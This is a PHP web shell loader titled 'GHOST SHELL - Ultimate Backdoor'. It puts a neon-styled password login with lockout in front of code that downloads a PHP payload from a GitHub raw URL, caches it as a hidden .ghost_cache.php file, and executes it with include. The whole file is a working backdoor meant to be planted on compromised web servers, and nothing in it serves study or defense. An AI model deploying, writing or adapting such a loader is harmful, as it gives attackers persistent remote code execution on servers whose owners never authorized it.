<?php
session_start();
session_regenerate_id(true);

// Ganti dengan hash yang lebih kuat (SHA256 + salt acak)
define('USERNAME_HASH', hash('sha256', 'n4th4n' . 'S4LT_B3R4T_GHOST'));
define('PASSWORD_HASH', hash('sha256', 'shell@2026' . 'S4LT_B3R4T_GHOST'));
define('MAX_ATTEMPTS', 3);
define('LOCKOUT_TIME', 300); // 5 menit dalam detik

// Inisialisasi percobaan gagal
if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
}
if (!isset($_SESSION['last_attempt_time'])) {
    $_SESSION['last_attempt_time'] = 0;
}

// Fungsi login form dengan proteksi
function display_login_form($error = '') {
    // Bersihkan output buffer
    while (ob_get_level()) ob_end_clean();
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>GHOST SHELL - Ultimate Backdoor</title>
        <style>
            @import url("https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap");
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                font-family: "Orbitron", monospace;
                background: #0a0a0a;
                background-image: 
                    radial-gradient(ellipse at 20% 50%, rgba(0, 255, 200, 0.05) 0%, transparent 60%),
                    radial-gradient(ellipse at 80% 50%, rgba(255, 0, 200, 0.05) 0%, transparent 60%),
                    linear-gradient(180deg, #0a0a0a 0%, #1a0a1a 100%);
                overflow: hidden;
            }
            .glitch-bg {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: 
                    repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,200,0.01) 2px, rgba(0,255,200,0.01) 4px);
                pointer-events: none;
                z-index: 0;
            }
            .login-container {
                position: relative;
                z-index: 1;
                background: rgba(10, 10, 20, 0.9);
                padding: 50px 40px;
                border-radius: 20px;
                box-shadow: 
                    0 0 40px rgba(0, 255, 200, 0.2),
                    0 0 80px rgba(0, 255, 200, 0.05),
                    inset 0 0 40px rgba(0, 255, 200, 0.05);
                width: 360px;
                text-align: center;
                border: 1px solid rgba(0, 255, 200, 0.2);
                backdrop-filter: blur(10px);
            }
            .login-container::before {
                content: "";
                position: absolute;
                top: -2px;
                left: -2px;
                right: -2px;
                bottom: -2px;
                border-radius: 22px;
                background: linear-gradient(45deg, #00ffc8, transparent, #ff00c8, transparent);
                background-size: 400% 400%;
                z-index: -1;
                animation: borderGlow 6s ease infinite;
                opacity: 0.5;
            }
            @keyframes borderGlow {
                0% { background-position: 0% 50%; }
                50% { background-position: 100% 50%; }
                100% { background-position: 0% 50%; }
            }
            .login-container img {
                width: 120px;
                border-radius: 50%;
                border: 2px solid #00ffc8;
                box-shadow: 0 0 30px rgba(0, 255, 200, 0.3);
                margin-bottom: 20px;
                filter: grayscale(30%) brightness(1.1);
            }
            h2 {
                color: #00ffc8;
                font-size: 28px;
                font-weight: 900;
                letter-spacing: 4px;
                text-shadow: 0 0 20px rgba(0, 255, 200, 0.5), 0 0 40px rgba(0, 255, 200, 0.2);
                margin-bottom: 5px;
                text-transform: uppercase;
            }
            .subtitle {
                color: #667;
                font-size: 11px;
                letter-spacing: 3px;
                margin-bottom: 25px;
                font-family: "Courier New", monospace;
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 14px 18px;
                margin: 10px 0;
                border: none;
                border-radius: 10px;
                background: rgba(0, 0, 0, 0.6);
                color: #00ffc8;
                font-size: 14px;
                font-family: "Courier New", monospace;
                outline: none;
                border: 1px solid rgba(0, 255, 200, 0.1);
                transition: 0.4s;
                letter-spacing: 1px;
            }
            input[type="text"]:focus, input[type="password"]:focus {
                border-color: #00ffc8;
                box-shadow: 0 0 20px rgba(0, 255, 200, 0.15);
                background: rgba(0, 0, 0, 0.8);
            }
            input[type="text"]::placeholder, input[type="password"]::placeholder {
                color: #334;
                letter-spacing: 2px;
                font-size: 12px;
            }
            input[type="submit"] {
                width: 100%;
                padding: 15px;
                background: linear-gradient(135deg, #00ffc8, #00cc99);
                border: none;
                border-radius: 10px;
                font-size: 16px;
                font-family: "Orbitron", monospace;
                font-weight: 700;
                color: #0a0a0a;
                cursor: pointer;
                transition: 0.4s;
                margin-top: 15px;
                text-transform: uppercase;
                letter-spacing: 3px;
                box-shadow: 0 0 30px rgba(0, 255, 200, 0.2);
            }
            input[type="submit"]:hover {
                transform: scale(1.02);
                box-shadow: 0 0 50px rgba(0, 255, 200, 0.4);
                background: linear-gradient(135deg, #00ffc8, #00ffaa);
            }
            input[type="submit"]:active {
                transform: scale(0.98);
            }
            .error {
                color: #ff4466;
                background: rgba(255, 0, 50, 0.1);
                padding: 12px;
                border-radius: 10px;
                margin-bottom: 15px;
                font-size: 12px;
                border-left: 3px solid #ff4466;
                font-family: "Courier New", monospace;
                letter-spacing: 1px;
                text-shadow: 0 0 10px rgba(255, 0, 50, 0.2);
            }
            .credit {
                margin-top: 25px;
                font-size: 11px;
                color: #334;
                letter-spacing: 2px;
                font-family: "Courier New", monospace;
            }
            .credit span {
                color: #00ffc8;
                text-shadow: 0 0 10px rgba(0, 255, 200, 0.2);
            }
            .status-dot {
                display: inline-block;
                width: 8px;
                height: 8px;
                background: #00ffc8;
                border-radius: 50%;
                margin-right: 8px;
                animation: pulse 2s infinite;
                box-shadow: 0 0 15px rgba(0, 255, 200, 0.5);
            }
            @keyframes pulse {
                0% { opacity: 1; transform: scale(1); }
                50% { opacity: 0.3; transform: scale(0.8); }
                100% { opacity: 1; transform: scale(1); }
            }
        </style>
    </head>
    <body>
        <div class="glitch-bg"></div>
        <div class="login-container">
            <img src="https://i.ibb.co.com/VgXFFdH/20230310-235537.png" alt="GHOST SHELL">
            <h2>GHOST SHELL</h2>
            <div class="subtitle">◈ ULTIMATE BACKDOOR ◈</div>';
    if ($error) {
        echo "<div class='error'>⛧ $error</div>";
    }
    echo '<form method="POST">
            <input type="text" name="username" placeholder="✧ USERNAME" required autocomplete="off">
            <input type="password" name="password" placeholder="✦ PASSWORD" required autocomplete="off">
            <input type="submit" value="⚡ ACCESS ⚡">
          </form>
          <div class="credit"><span class="status-dot"></span>CREDIT BY <span>@GHOSTLYROOT</span></div>
        </div>
    </body>
    </html>';
    exit;
}

// Cek lockout
if ($_SESSION['login_attempts'] >= MAX_ATTEMPTS && (time() - $_SESSION['last_attempt_time']) < LOCKOUT_TIME) {
    $remaining = LOCKOUT_TIME - (time() - $_SESSION['last_attempt_time']);
    display_login_form("TOO MANY ATTEMPTS • LOCKED FOR " . ceil($remaining/60) . " MINUTES");
}

// Proses login
if (!isset($_SESSION['authenticated'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
        $input_user = $_POST['username'];
        $input_pass = $_POST['password'];
        
        // Hash input dengan salt yang sama
        $hashed_user = hash('sha256', $input_user . 'S4LT_B3R4T_GHOST');
        $hashed_pass = hash('sha256', $input_pass . 'S4LT_B3R4T_GHOST');
        
        if ($hashed_user === USERNAME_HASH && $hashed_pass === PASSWORD_HASH) {
            // Reset percobaan dan set session
            $_SESSION['authenticated'] = true;
            $_SESSION['login_attempts'] = 0;
            $_SESSION['last_attempt_time'] = 0;
            session_regenerate_id(true);
            // Redirect ke halaman utama tanpa query string
            $redirect = strtok($_SERVER['SCRIPT_NAME'], '?');
            header("Location: $redirect");
            exit;
        } else {
            $_SESSION['login_attempts']++;
            $_SESSION['last_attempt_time'] = time();
            if ($_SESSION['login_attempts'] >= MAX_ATTEMPTS) {
                display_login_form("⛔ MAX ATTEMPTS REACHED • LOCKED 5 MINUTES");
            } else {
                display_login_form("✘ INCORRECT • ATTEMPT " . $_SESSION['login_attempts'] . "/" . MAX_ATTEMPTS);
            }
        }
    } else {
        display_login_form();
    }
}

// ====== ZONA EKSEKUSI SHELL ======
// Ambil file remote dengan caching lokal
$cache_file = __DIR__ . '/.ghost_cache.php';
$remote_url = 'https://raw.githubusercontent.com/GhostlyrootB2H/Shell-Private/refs/heads/main/ghostlyroot.php';

// Jika cache ada dan umurnya kurang dari 1 jam (3600 detik), pakai cache
if (file_exists($cache_file) && (time() - filemtime($cache_file) < 3600)) {
    include($cache_file);
} else {
    // Download file remote
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 15,
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]
    ]);
    $remote_content = @file_get_contents($remote_url, false, $ctx);
    
    if ($remote_content !== false) {
        // Bersihkan tag PHP pembuka dan tutup agar aman untuk eval/include
        $clean_content = preg_replace('/^<\?php\s*/', '', $remote_content);
        $clean_content = preg_replace('/\?>\s*$/', '', $clean_content);
        // Simpan ke cache
        file_put_contents($cache_file, '<?php ' . $clean_content);
        include($cache_file);
    } else {
        // Fallback: jika gagal download dan cache lama pun tidak ada
        if (file_exists($cache_file)) {
            include($cache_file);
        } else {
            die('<h1 style="color:#ff4466;text-align:center;font-family:monospace;margin-top:20%;">⛧ GHOST SHELL ERROR ⛧<br><span style="font-size:14px;color:#667;">Remote unavailable & no cache</span></h1>');
        }
    }
}
?>
